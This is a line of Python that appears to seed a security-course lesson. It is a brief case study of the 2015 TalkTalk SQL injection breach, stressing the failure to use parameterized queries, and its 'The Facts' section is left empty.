    l7_3 = Lesson(module_id=m7.id, order_index=3, title="Case Study: TalkTalk Telecom (2015)", narrative="**Narrative**: *British telecom company TalkTalk was breached by a 15-year-old using SQL injection. Yes, fifteen.*\\n**The Facts**:\\n**The lesson**: The attacker wasn't a sophisticated nation-state hacker. They used **freely available tools** (like sqlmap) against a well-known vulnerability. The company's failure to implement basic security practices — specifically parameterized queries — cost them over $100 million.", code_snippet=None, code_language=None, table_data=None)
